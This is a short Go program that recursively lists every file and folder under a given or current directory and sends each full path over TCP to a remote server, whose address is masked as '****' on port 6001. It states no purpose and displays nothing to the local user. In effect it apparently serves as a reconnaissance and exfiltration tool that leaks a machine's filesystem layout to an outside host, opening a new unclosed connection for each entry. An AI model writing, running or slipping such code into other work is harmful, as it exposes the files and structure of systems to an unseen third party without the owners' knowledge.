package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"time"
)

var (
	err  error
	path string
	conn net.Conn
)

func main() {
	defer func() {
		if err1 := recover(); err1 != nil {
			fmt.Println(err1)
		}
	}()
	startTime := time.Now().UnixNano()
	if len(os.Args) < 2 {
		path, err = os.Getwd()
		CheckErr(err)
		ListDirs(path)
	} else {
		path := os.Args[1]
		fmt.Println(path)
		ListDirs(path)
	}
	endTime := time.Now().UnixNano()
	totalTime := endTime - startTime
	fmt.Println(totalTime / 1000)
}
func CheckErr(e error) {
	if e != nil {
		panic(e)
	}
}
func ListDirs(path string) {
	dirlist, err1 := ioutil.ReadDir(path)
	PthSep := string(os.PathSeparator)
	if err1 != nil {
		fmt.Println("read dir error")
		return
	}
	for _, list := range dirlist {
		if list.IsDir() {
			//		fmt.Println("dir:", path+PthSep+list.Name())
			ListDirs(path + PthSep + list.Name())
		} else {
			//		fmt.Println("file:", path+PthSep+list.Name())
		}
		sendtoserver(path + PthSep + list.Name() + "\n")
	}
}
func sendtoserver(name string) {
	conn, err = net.Dial("tcp", "****:6001")
	if err != nil {
		log.Fatal(err)
		os.Exit(1)
	}
	fmt.Fprintf(conn, name)
}
